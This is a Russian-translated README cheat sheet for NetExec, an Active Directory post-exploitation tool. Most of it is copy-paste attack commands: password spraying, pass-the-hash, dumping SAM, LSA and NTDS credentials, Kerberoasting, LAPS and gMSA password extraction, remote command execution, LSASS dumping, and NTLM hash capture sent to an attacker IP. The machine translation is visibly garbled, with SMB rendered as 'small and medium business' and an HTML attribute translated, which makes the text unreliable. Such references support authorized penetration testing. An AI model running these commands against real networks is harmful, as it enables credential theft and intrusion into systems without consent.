<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Преемник">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Многопротокольный">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Сетевое пентестирование">
</p>

<p выравнивание="центр">
  <b>🌐 Официальный преемник CrackMapExec, созданный сообществом для использования в сети и Active Directory</b>
</p>

---

## 📋 Содержание

- [Введение](#-введение)
- [Почему NetExec вместо CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Установка](#-установка)
- [Поддерживаемые протоколы](#-поддерживаемых протоколов)
- [Эксплуатация SMB](#-smb-эксплуатация)
  - [Перечисление разведки и обмена](#reconnaissance--share-enumeration)
  - [Распыление пароля и проверка учетных данных](#password-spraying-credential-testing)
  - [Передать хеш (PtH) и передать билет (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Сброс учетных данных (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Выполнение команды](#command-execution)
- [Эксплуатация LDAP](#-ldap-эксплуатация)
  - [Перечисление доменов и политика паролей](#domain-enumeration--password-policy)
  - [AS-REP Roasting & Kerberoasting](#as-rep-roasting--kerberoasting)
  - [Извлечение LAPS и gMSA](#laps--gmsa-extraction)
  - [Прием данных BloodHound](#bloodhound-data-ingestion)
- [Эксплуатация MSSQL](#-mssql-эксплуатация)
- [Модули WinRM, RDP и SSH](#-winrm-rdp--ssh-modules)
- [Популярные модули NetExec (`-M`)](#-popular-netexec-modules--m)
- [Рабочие пространства и встроенная база данных](#-workspaces--built-in-database)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Советы и рекомендации](#-tips--best-practices)
- [Юридическая оговорка](#-юридическая оговорка)
- [Ресурсы](#-ресурсы)

---

## 🎯 Введение

**NetExec** (`nxc`) — это многоцелевой инструмент после эксплуатации, предназначенный для автоматизации оценки крупных сетей Active Directory и Windows. Это официальная активная ветка сообщества и продолжение **CrackMapExec** (CME), созданная после того, как CME была удалена и заархивирована ее первоначальным автором.

NetExec действует как сетевой «швейцарский нож», беспрепятственно взаимодействуя с SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP и VNC для автоматизации аутентификации, сброса учетных данных, проверки уязвимостей и горизонтального перемещения.

---

## ⚖️ Почему NetExec вместо CrackMapExec?

| Особенность | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|---------------|
| **Статус разработки** | 🛑 В архиве/устарело | 🟢 Активно поддерживается |
| **Поддержка Python** | Наследие (Python 3.8–3.10) | Современный Python 3.10+ |
| **Поддержка протоколов** | SMB, LDAP, MSSQL, WinRM, SSH | + Улучшения VNC, FTP, RDP, WMI |
| **Поддержка BloodHound** | Только BloodHound Legacy | BloodHound CE и наследие |
| **Kerberos и PKINIT** | Ограниченная | Надежная поддержка билетов PKINIT и Kerberos |
| **Исправления ошибок и модули** | Замороженный | Постоянно обновляемые модули CVE и эксплойтов |

---

## 📥 Установка

### Использование pipx (рекомендуется)
```bash
pipx install netexec
```
### Кали Линукс

NetExec — официальная замена CrackMapExec в Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Докер
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Проверка
```bash
nxc --version
```
---

## 🔌 Поддерживаемые протоколы

NetExec принимает целевой протокол в качестве основного аргумента:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` — Блок сообщений сервера (общие ресурсы, дамп SAM/LSA/NTDS, выполнение команды)
- `nxc ldap` — облегченный протокол доступа к каталогам (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (запросы к базе данных, xp_cmdshell, олицетворение)
- `nxc winrm` — Удаленное управление Windows (скрытое выполнение команд)
- `nxc rdp` - Протокол удаленного рабочего стола (проверка подлинности, скриншоты)
- `nxc ssh` — Secure Shell (тестирование и выполнение учетных данных Linux/UNIX)
- `nxc ftp` / `nxc vnc` — передача файлов и вычисления в виртуальной сети

---

## 🛡️ Эксплуатация малого и среднего бизнеса

### Разведка и перечисление общего доступа
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Распыление паролей и проверка учетных данных
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Передача хеша (PtH) и передача билета (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Сброс учетных данных (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Выполнение команды
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 Эксплуатация LDAP

### Перечисление доменов и политика паролей
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP обжиг и Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### LAPS и экстракция gMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Прием данных BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ Эксплуатация MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 Модули WinRM, RDP и SSH

### Выполнение команды WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Снимки экрана и аутентификация RDP
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### SSH-распыление и команды
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Популярные модули NetExec (`-M`)

| Модуль | Протокол | Описание | Пример |
|--------|----------|-------------|---------|
| `spooler` | СМБ | Проверьте, запущена ли служба диспетчера очереди печати (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | СМБ | Проверьте наличие уязвимости CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | СМБ | Проверьте наличие CVE-2021-42278/CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | СМБ | Проверьте, уязвим ли хост для приведения PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | СМБ | Скрыть минидамп памяти LSASS с помощью nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | СМБ | Проверьте, активна ли служба WebClient для ретрансляции WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | ЛДАП | Дамп паролей LAPS для рабочих станций | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | ЛДАП | Извлечение секретов групповой управляемой сервисной учетной записи | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Рабочие пространства и встроенная база данных

NetExec автоматически записывает все обнаруженные хосты, действительные учетные данные и хэши в локальную базу данных SQLite (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Краткая справочная таблица

| Задача | Протокол | Команда |
|------|----------|---------|
| **Перечислить акции** | СМБ | `nxc smb <IP> -u '' -p '' --shares` |
| **Проверьте правила пропуска** | СМБ | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Спрей для пароля** | СМБ | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Передайте хэш** | СМБ | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Сбросить СЭМ** | СМБ | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Дамп NTDS** | СМБ | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **Обжарка AS-REP** | ЛДАП | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Кербероастинг** | ЛДАП | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Свалка BloodHound** | ЛДАП | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Советы и рекомендации

1. **Всегда сначала проверяйте политику паролей:**
   Перед запуском любого распылителя паролей всегда запускайте `nxc smb <DC> -u <USER> -p <PASS> --pass-pol`, чтобы проверить `Account Lockout Threshold`. Если установлено значение 3 или 5, распыляйте только один раз каждые 30+ минут, чтобы избежать блокировки учетных записей домена.
2. **Используйте `--local-auth` для рабочих станций:**
   При проверке учетных данных локального администратора на рабочих станциях вместо учетных данных домена всегда включайте флаг `--local-auth`.
3. **Поворотная интеграция:**
   NetExec без проблем работает через прокси-серверы SOCKS (например, `proxychains nxc smb ...`) или через интерфейсы Ligolo-ng TUN с собственной скоростью!

---

## ⚠️ Юридическая оговорка

> **ВАЖНО:** NetExec — это инструмент оценки безопасности. Его необходимо строго использовать в компьютерных сетях и доменной инфраструктуре, где вы получили явное, документированное разрешение.

---

## 📚 Ресурсы

- [Официальный репозиторий NetExec на GitHub](https://github.com/Pennyw0rth/NetExec)
- [Официальная документация NetExec](https://www.netexec.wiki/)